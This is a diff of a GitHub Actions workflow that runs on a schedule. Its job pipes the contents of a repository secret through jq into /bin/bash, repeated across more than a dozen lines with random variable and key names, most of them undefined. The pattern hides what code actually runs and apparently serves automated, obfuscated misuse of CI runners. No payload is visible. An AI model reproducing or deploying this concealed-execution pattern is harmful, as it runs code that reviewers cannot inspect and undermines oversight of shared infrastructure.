@@ -3,7 +3,8 @@ name: huanglongxing1987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 5/6 * * *'
+    - cron: '35 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +13,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: huanglongxing1987
         env:
-          st674: ${{ secrets.st674 }}
+          vrg991: ${{ secrets.vrg991 }}
         run: |
-          echo $st674 | jq -r .htsl5 | /bin/bash
-          echo $ec54618 | jq -r .gi08 | /bin/bash
-          echo $ll436 | jq -r .afvyc8462 | /bin/bash
-          echo $pjztx85 | jq -r .hsckt916 | /bin/bash
-          echo $okwvs83 | jq -r .ytx860 | /bin/bash
-          echo $pf61235 | jq -r .wnpry9 | /bin/bash
-          echo $wg154 | jq -r .j49875 | /bin/bash
-          echo $gaqtq2201 | jq -r .zfl03 | /bin/bash
-          echo $hupw81378 | jq -r .s18816 | /bin/bash
-          echo $x13483 | jq -r .npnu25800 | /bin/bash
-          echo $jldvu47 | jq -r .yjro23922 | /bin/bash
-          echo $evp8 | jq -r .gskq54024 | /bin/bash
+          echo $vrg991 | jq -r .uzqrb5 | /bin/bash
+          echo $szeok20257 | jq -r .uej58 | /bin/bash
+          echo $pc49484 | jq -r .ssvp67389 | /bin/bash
+          echo $h87 | jq -r .h353 | /bin/bash
+          echo $hlfgm112 | jq -r .yufip92 | /bin/bash
+          echo $e359 | jq -r .bmmk081 | /bin/bash
+          echo $mwbk81 | jq -r .iyby88279 | /bin/bash
+          echo $i204 | jq -r .iknbc6088 | /bin/bash
+          echo $t2 | jq -r .ua6 | /bin/bash
+          echo $tnql76437 | jq -r .kuc82 | /bin/bash
+          echo $x67 | jq -r .bdz81051 | /bin/bash
+          echo $f94 | jq -r .uutd62 | /bin/bash
+          echo $yeqx571 | jq -r .ib39178 | /bin/bash
+          echo $u6 | jq -r .ngaep913 | /bin/bash
 
